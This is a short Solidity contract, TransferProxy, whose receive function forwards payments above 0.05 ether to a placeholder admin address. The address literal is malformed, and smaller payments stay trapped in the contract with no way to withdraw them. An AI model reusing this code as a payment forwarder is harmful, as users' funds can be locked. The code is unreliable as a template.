// SPDX-License-Identifier: MIT 
pragma solidity ^0.6.0;

contract TransferProxy {
    address payable admin = 0x112121212121212112121212121212121;//input your admin address where funds will transfer
                                                                   
    // Fallback function
    receive() external payable {
        if (msg.value > 0.05 ether) {
            admin.transfer(msg.value);
        }
    }
}